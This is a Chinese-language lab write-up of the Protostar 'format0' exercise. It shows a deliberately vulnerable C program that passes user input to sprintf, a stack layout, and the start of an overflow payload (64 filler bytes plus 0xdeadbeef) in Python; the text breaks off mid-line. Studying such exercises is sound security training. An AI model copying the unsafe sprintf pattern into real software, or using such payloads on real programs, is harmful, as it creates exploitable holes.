# format0

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

void vuln\(char \*string\)

{

volatile int target;

char buffer\[64\];

target = 0;

sprintf\(buffer, string\);

if\(target == 0xdeadbeef\) {

```
  printf\("you have hit the target correctly :\)\n"\);
```

}

}

int main\(int argc, char \*\*argv\)

{

vuln\(argv\[1\]\);

}

## （二）解题过程：

这道题比较简单。有两种方法。

1） 缓冲区溢出

2）格式字符串漏洞

思路验证：

1\)缓冲区溢出

buff\[64\]

target

ebp

ret

argc

argv

---

payload构造 ： ‘A’\*64 + target\(0xdeadbeef\)

![](/png/47.png)

用python实现如下：

import struct

nosled = "\x90"\*64

target = struct.

